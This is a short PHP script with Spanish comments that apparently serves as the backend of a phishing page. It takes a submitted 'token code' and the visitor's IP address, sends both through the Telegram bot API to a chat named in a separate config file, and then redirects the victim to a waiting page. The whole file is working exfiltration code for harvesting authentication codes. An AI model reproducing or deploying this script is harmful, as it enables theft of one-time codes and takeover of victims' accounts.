<?php
// Incluir los datos sensibles desde data.php
$data = include('data.php');

// Obtener los datos del formulario
$codigo = $_POST['data'];

// Obtener la dirección IP del usuario
$ip = $_SERVER['REMOTE_ADDR'];

// Crear el mensaje que se enviará a Telegram
$mensaje = "Código TOken: " . $codigo . "\nIP: " . $ip;

// Preparar la URL para enviar el mensaje a Telegram
$url = "https://api.telegram.org/bot" . $data['token'] . "/sendMessage?chat_id=" . $data['chat_id'] . "&text=" . urlencode($mensaje);

// Hacer la solicitud a la API de Telegram
$response = file_get_contents($url);

// Verificar si se envió correctamente el mensaje y redirigir a otra página
if ($response) {
    // Redirigir a otra página después de enviar el mensaje
    header("Location: espera2.html");
    exit();
} else {
    echo "Hubo un error al enviar el código.";
}
?>
